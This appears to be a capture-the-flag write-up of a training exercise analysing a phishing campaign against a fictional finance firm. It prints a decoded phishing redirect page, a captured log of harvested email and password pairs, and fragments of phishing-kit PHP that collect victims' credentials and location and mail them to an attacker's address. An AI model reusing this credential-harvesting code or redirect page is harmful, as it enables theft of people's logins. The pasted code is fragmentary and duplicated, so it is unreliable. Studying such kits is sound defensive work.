# Snapped Phishing Line — Writeup

## Overview
### Snapped Phishing Line — Writeup
### Snapped Phishing Line — Writeup
----
Apply learned skills to probe malicious emails and URLs, exposing a vast phishing campaign.
----
![](https://tryhackme-images.s3.amazonaws.com/room-icons/2744ff6e0642617d15b7e866a189531a.png)
Start Machine
Disclaimer
Based on real-world occurrences and past analysis, this scenario presents a narrative with invented names, characters, and events.
**Please note:** The phishing kit used in this scenario was retrieved from a real-world phishing campaign. Hence, it is advised that interaction with the phishing artefacts be done only inside the attached VM, as it is an isolated environment.
An Ordinary Midsummer Day...
As an IT department personnel of SwiftSpend Financial, one of your responsibilities is to support your fellow employees with their technical concerns. While everything seemed ordinary and mundane, this gradually changed when several employees from various departments started reporting an unusual email they had received. Unfortunately, some had already submitted their credentials and could no longer log in.
You now proceeded to investigate what is going on by:
1. Analysing the email samples provided by your colleagues.
2. Analysing the phishing URL(s) by browsing it using Firefox.
3. Retrieving the phishing kit used by the adversary.
4. Using CTI-related tooling to gather more information about the adversary.
5. Analysing the phishing kit to gather more information about the adversary.
Connecting to the machine
Start the virtual machine in split-screen view by clicking the green **Start Machine** button on the upper right section of this task. If the VM is not visible, use the blue **Show Split View** button at the top-right of the page. Alternatively, using the credentials below, you can connect to the VM via RDP.
|   |   |
|---|---|
|**Username**|damianhall|
|**Password**|Phish321|
|**IP**|MACHINE_IP|
**Note:** The phishing emails to be analysed are under the _**phish-emails**_ directory on the Desktop. Usage of a web browser, text editor and some knowledge of the **grep** command will help.
Answer the questions below
```text
5th email

From: "Group Marketing Online Accounts Payable"
 <Accounts.Payable@groupmarketingonline.icu>
To: "William McClean" <william.mcclean@swiftspend.finance>

4th email (last Ctrl +U )

PCFET0NUWVBFIGh0bWw+DQo8aHRtbD4NCjxoZWFkPg0KCTx0aXRsZT5SZWRpcmVjdGluZy4gLiAuPC90aXRsZT4NCgk8bWV0YSBodHRwLWVxdWl2PSJyZWZyZXNoIiBjb250ZW50PSIwO1VSTD0naHR0cDovL2tlbm5hcm9hZHMuYnV6ei9kYXRhL1VwZGF0ZTM2NS9vZmZpY2UzNjUvNDBlN2JhYTJmODI2YTU3ZmNmMDRlNTIwMjUyNmY4YmQvP2VtYWlsPXpvZS5kdW5jYW5Ac3dpZnRzcGVuZC5maW5hbmNlJmVycm9yJyIgLz4NCjwvaGVhZD4NCjxib2R5Pg0KCTxoMT5SZWRpcmVjdGluZy4gLiAuPC9oMT4NCgk8cD5JZiB5b3UgYXJlIG5vdCByZWRpcmVjdGVkIGF1dG9tYXRpY2FsbHksIHBsZWFzZSBjbGljayA8YSBocmVmPSJodHRwOi8va2VubmFyb2Fkcy5idXp6L2RhdGEvVXBkYXRlMzY1L29mZmljZTM2NS80MGU3YmFhMmY4MjZhNTdmY2YwNGU1MjAyNTI2ZjhiZC8/ZW1haWw9em9lLmR1bmNhbkBzd2lmdHNwZW5kLmZpbmFuY2UmZXJyb3IiPmhlcmU8L2E+LjwvcD4NCjwvYm9keT4NCjwvaHRtbD4=

<!DOCTYPE html>
<html>
<head>
	<title>Redirecting. . .</title>
	<meta http-equiv="refresh" content="0;URL='http://kennaroads.buzz/data/Update365/office365/40e7baa2f826a57fcf04e5202526f8bd/?email=zoe.duncan@swiftspend.finance&error'" />
</head>
<body>
	<h1>Redirecting. . .</h1>
	<p>If you are not redirected automatically, please click <a href="http://kennaroads.buzz/data/Update365/office365/40e7baa2f826a57fcf04e5202526f8bd/?email=zoe.duncan@swiftspend.finance&error">here</a>.</p>
</body>
</html>

defanging url

hxxp[://]kennaroads[.]buzz/data/Update365/office365/40e7baa2f826a57fcf04e5202526f8bd/?email=zoe[.]duncan@swiftspend[.]finance&error

hxxp[://]kennaroads[.]buzz/data/Update365[.]zip

damianhall@SSFWKNIT001:~/Downloads$ sha256sum Update365.zip 
ba3c15267393419eb08c7b2652b8b6b39b406ef300ae8a18fee4d16b19ac9686  Update365.zip

[VirusTotal - File - ba3c15267393419eb08c7b2652b8b6b39b406ef300ae8a18fee4d16b19ac9686](https://www.virustotal.com/gui/file/ba3c15267393419eb08c7b2652b8b6b39b406ef300ae8a18fee4d16b19ac9686/details)

[Domain intelligence｜ThreatBook CTI](https://threatbook.io/domain/kennaroads.buzz)

update on 

Registrant

REDACTED FOR PRIVACY

Registrant Organization

9fe2737259be05fc340dad92750f0e493bae52c2de564550

Registrant Email

Redacted for Privacy Purposes

Address

-

Phone

REDACTED FOR PRIVACY

Registration Date

Expiration Date

Last update

Registrar

NameSilo, LLC

Name Server

-

http://kennaroads.buzz/data/Update365/log.txt

---------+ Office365 Login  |+-------
Email : isaiah.puzon@gmail.com
Password : PhishMOMUKAMO123!
-----------------------------------
Client IP: 158.62.17.197
User Agent : Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0
Country : Philippines
Date: Mon Jun 29, 2020 10:00 am
--- http://www.geoiptool.com/?IP=158.62.17.197 ----
--+ Created BY Real Carder +---
---------+ Office365 Login  |+-------
Email : michael.ascot@swiftspend.finance
Password : Invoice2023!
-----------------------------------
Client IP: 64.62.197.80
User Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
Country : United States
Date: Mon Jun 29, 2020 10:01 am
--- http://www.geoiptool.com/?IP=64.62.197.80 ----
--+ Created BY Real Carder +---
---------+ Office365 Login  |+-------
Email : zoe.duncan@swiftspend.finance
Password : Passw0rd1!
-----------------------------------
Client IP: 64.62.197.80
User Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
Country : United States
Date: Mon Jun 29, 2020 10:01 am
--- http://www.geoiptool.com/?IP=64.62.197.80 ----
--+ Created BY Real Carder +---
---------+ Office365 Login  |+-------
Email : michael.ascot@swiftspend.finance
Password : Invoice2023!
-----------------------------------
Client IP: 64.62.197.80
User Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
Country : United States
Date: Mon Jun 29, 2020 10:01 am
--- http://www.geoiptool.com/?IP=64.62.197.80 ----
--+ Created BY Real Carder +---
---------+ Office365 Login  |+-------
Email : derick.marshall@swiftspend.finance
Password : lol
-----------------------------------
Client IP: 64.62.197.80
User Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
Country : United States
Date: Mon Jun 29, 2020 10:01 am
--- http://www.geoiptool.com/?IP=64.62.197.80 ----
--+ Created BY Real Carder +---
---------+ Office365 Login  |+-------
Email : michelle.chen@swiftspend.finance
Password : testing123
-----------------------------------
Client IP: 64.62.197.80
User Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
Country : United States
Date: Mon Jun 29, 2020 10:01 am
--- http://www.geoiptool.com/?IP=64.62.197.80 ----
--+ Created BY Real Carder +---
---------+ Office365 Login  |+-------
Email : derick.marshall@swiftspend.finance
Password : a
-----------------------------------
Client IP: 172.67.216.206
User Agent : Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0
Country : Unknown
Date: Sun Jul 09, 2023 4:02 am
--- http://www.geoiptool.com/?IP=172.67.216.206 ----
--+ Created BY Real Carder +---

damianhall@SSFWKNIT001:~/Downloads$ grep -iRl "gmail" /home/damianhall/Downloads/ 2>/dev/null
/home/damianhall/Downloads/Update365/office365/updat.cmd
/home/damianhall/Downloads/Update365/office365/script.st

 <div class="login-html">
	  <div class="LogoOne"></div>
	   <div class="foot-lnk">To access the attached document, Select with email provider below. </div>
    <!--<div class="top"></div>-->
    <!--<input id="tab-1" type="radio" name="tab" class="sign-in" checked><label for="tab-1" class="tab">Sign In</label>
		
    //get user's ip address 
    $geoplugin->locate();
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
    }

    $message = "";
	$message .= "---|BLESSINGS|---\n";
    $message .= "Email Provider: Yahoo\n";
    $message .= "E: " . $_GET['email'] . "\n"; 
    $message .= "Ps: " . $_GET['password'] . "\n"; 
    $message .= "IP : " .$ip. "\n"; 
    $message .= "--------------------------\n";
    $message .=     "City: {$geoplugin->city}\n";
    $message .=     "Region: {$geoplugin->region}\n";
    $message .=     "Country Name: {$geoplugin->countryName}\n";
    $message .=     "Country Code: {$geoplugin->countryCode}\n";
    $message .= "--------------------------\n";

	$to ="jamestanner2299@gmail.com"
		<input id="tab-2" type="radio" name="tab" class="sign-up"><label for="tab-2" class="tab">Sign Up</label>-->
    <div class="login-form">
      <div class="sign-in-htm">
        <div class="group">
          <div class="btn-3 loginBtn loginBtn--office"><a href="o1">Login with Office 365</a></div>
        </div>
        <div class="group">
          <div class="btn-3 loginBtn loginBtn--outlook"><a href="o4">Login with Outlook</a></div>
        </div>
        <div class="group">
          <div class="btn-3 loginBtn loginBtn--aol"><a href="a2">Login with Aol</a></div>
        </div>
        <div class="group">
			<div class="btn-3 loginBtn loginBtn--yahoo"><a href="y3">Login with Yahoo</a></div>
        </div>
        <div class="group">
          <div class="btn-3 loginBtn loginBtn--other"><a href="o6">Login with Other Mail</a></div>
		  	require_once('geoplugin.class.php');
	$geoplugin = new geoPlugin();

    //get user's ip address 
    $geoplugin->locate();
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
    }

    $message = "";
	$message .= "---|BLESSINGS|---\n";
    $message .= "Email Provider: Yahoo\n";
    $message .= "E: " . $_GET['email'] . "\n"; 
    $message .= "Ps: " . $_GET['password'] . "\n"; 
    $message .= "IP : " .$ip. "\n"; 
    $message .= "--------------------------\n";
    $message .=     "City: {$geoplugin->city}\n";
    $message .=     "Region: {$geoplugin->region}\n";
    $message .=     "Country Name: {$geoplugin->countryName}\n";
    $message .=     "Country Code: {$geoplugin->countryCode}\n";
    $message .= "--------------------------\n";

	$to ="jamestanner2299@gmail.com"

	$subject = "Yahoo | $ip";
	$headers = "From: Blessing <blessing@heaven.com>";
	
 <div class="login-html">
	  <div class="LogoOne"></div>
	   <div class="foot-lnk">To access the attached document, Select with email provider below. </div>
    <!--<div class="top"></div>-->
    <!--<input id="tab-1" type="radio" name="tab" class="sign-in" checked><label for="tab-1" class="tab">Sign In</label>
		<input id="tab-2" type="radio" name="tab" class="sign-up"><label for="tab-2" class="tab">Sign Up</label>-->
    <div class="login-form">
      <div class="sign-in-htm">
        <div class="group">
